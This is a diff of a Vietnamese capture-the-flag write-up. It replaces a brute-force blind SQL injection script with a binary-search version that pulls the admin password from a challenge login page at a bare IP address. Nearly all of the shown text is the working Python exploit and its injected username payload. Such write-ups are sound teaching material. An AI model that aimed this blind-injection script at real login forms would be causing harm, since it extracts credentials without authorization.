@@ -100,30 +100,41 @@ Flag: W1{webhook_not_so_bad_huh?}
     - **Cách 1**: Xoá cookie đang có để reset `$_SESSION` rồi bruteforce password từ trang `login.php`. Script bruteforce như sau:
 ```py
 import requests
-import string
 
 # charset = string.ascii_letters + string.digits + string.punctuation
-charset = [chr(i) for i in range(1100,2000)]
-
 url = "http://45.122.249.68:20017/login.php"
-flag = "_part"
-pos = 6
 
-while True:
-    for char in charset:
-        data = {
-            "username": f"admin' AND SUBSTRING((SELECT password FROM users WHERE username = 'admin'), {pos}, 1) = '{char}' --  ",
-            "password": "abc"
-        }
-        r = requests.post(url, data=data)
-        print("Đang test ký tự:", char, end='\r')
-        if r.url == "http://45.122.249.68:20017/news.php":
-            pos += 1
-            flag += char
-            print()
-            print("Part 3:", flag)
+
+def check(pos, operator, mid):
+    data = {
+        "username": f"admin' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username = 'admin'), {pos}, 1)) {operator} {mid} -- ",
+        "password": "abc",
+    }
+    r = requests.post(url, data=data)
+    return r.url == "http://45.122.249.68:20017/news.php"
+
+
+def bin_search(pos):
+    # Giới hạn trên mình tự tăng bằng tay vì trong flag có thêm icon nên mình sẽ tăng từ từ.
+    l, h = 0, 262144
+    while h - l > 1:
+        m = l + h >> 1
+        if check(pos, ">", m):
+            l = m
+        else:
+            h = m
+    return chr(h) if check(pos, "=", h) else None
+
+
+passwd = ""
+found = False
+while not found:
+    found = True
+    c = bin_search(len(passwd) + 1)
+    if c:
+        passwd += c
+        found = False
+        print("Password: ", passwd)
+        if c == "}":
             break
-    else:
-        continue
-
 ```
